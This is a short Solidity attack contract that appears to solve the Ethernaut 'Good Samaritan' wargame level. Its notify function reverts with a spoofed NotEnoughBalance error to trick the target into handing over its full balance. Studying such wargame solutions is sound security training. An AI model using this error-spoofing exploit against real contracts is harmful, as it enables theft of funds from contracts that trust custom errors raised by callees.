// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IGoodSamaritan {
    function requestDonation() external returns(bool);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanAttack is INotifyable {
    IGoodSamaritan public ethernautInstance;
    error NotEnoughBalance();

    constructor (address instanceAddress) {
        ethernautInstance = IGoodSamaritan(instanceAddress);
    }

    function attack() public {
        ethernautInstance.requestDonation();
    }

    function notify(uint256 amount) public override {
        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}